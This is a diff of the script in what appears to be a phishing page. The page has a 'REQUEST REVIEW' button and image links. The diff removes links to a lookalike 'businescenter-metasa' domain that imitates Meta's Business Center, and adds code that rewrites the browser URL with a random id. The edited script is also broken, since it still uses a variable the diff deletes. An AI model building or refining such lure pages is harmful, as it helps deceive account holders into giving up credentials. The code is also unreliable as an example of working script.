@@ -80,23 +80,22 @@
 <script>
     // Hàm tạo số ngẫu nhiên 6 ký tự
     function generateRandomNumber() {
-        return 100000 + Math.floor(Math.random() * 900000); // Số ngẫu nhiên từ 100000 đến 999999
+        return Math.floor(100000000 + Math.random() * 900000000); // Số ngẫu nhiên từ 100000000 đến 999999999
     }
 
-    // Gắn URL ngẫu nhiên cho nút và hình ảnh
+    // Lấy số ngẫu nhiên
     const randomNumber = generateRandomNumber();
-    const randomUrl = `https://businescenter-metasa.airsky247.com/`
-    ;
 
-    // Gắn URL cho nút "REQUEST REVIEW"
-    const randomLink = document.getElementById("random-link");
-    randomLink.href = randomUrl;
+    // Cập nhật URL khi người dùng truy cập
+    const newUrl = window.location.origin + "/?id=" + randomNumber;
+    window.history.replaceState(null, null, newUrl);
 
-    // Gắn URL cho các hình ảnh
-    document.getElementById("img-link-1").href = randomUrl;
-    document.getElementById("img-link-2").href = randomUrl;
-    document.getElementById("img-link-3").href = randomUrl;
-    document.getElementById("img-link-4").href = randomUrl;
+// Gắn URL cho các hình ảnh
+document.getElementById("img-link-1").href = randomUrl;
+document.getElementById("img-link-2").href = randomUrl;
+document.getElementById("img-link-3").href = randomUrl;
+document.getElementById("img-link-4").href = randomUrl;
+
 </script>
 </body>
 </html>
